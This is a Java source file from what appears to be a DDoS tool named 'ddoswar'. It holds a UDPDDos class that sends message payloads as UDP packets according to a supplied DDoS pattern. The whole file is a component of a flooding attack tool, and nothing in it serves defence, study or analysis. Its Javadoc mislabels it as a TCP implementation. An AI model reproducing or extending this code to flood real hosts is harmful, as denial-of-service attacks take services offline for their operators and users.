package ua.cc.lajdev.ddoswar.protocols.implementations;

import ua.cc.lajdev.ddoswar.DDOSPattern;
import ua.cc.lajdev.ddoswar.DDOSer;
import ua.cc.lajdev.ddoswar.protocols.interfaces.UDP;

import java.io.IOException;

/**
 * DDOS implementation for the TCP protocol.
 *
 */
public class UDPDDos extends UDP {

    /**
     * Constructor.
     * Create an UDP DDOS with a specified DDOS Pattern.
     *
     * @param ddosPattern
     */
    public UDPDDos(DDOSPattern ddosPattern, DDOSer ddoSer) {
        super(ddosPattern, ddoSer);
    }

    @Override
    public void writeLineToSocket(String message) {
        byte[] data = message.getBytes();
        getPacket().setData(data);
        getPacket().setLength(data.length);
        try {
            getSocket().send(getPacket());
        } catch (IOException ex) {
            DDOSer.appendToConsole("Error while connecting a Socket!");
            ex.getCause();
        }
    }
}
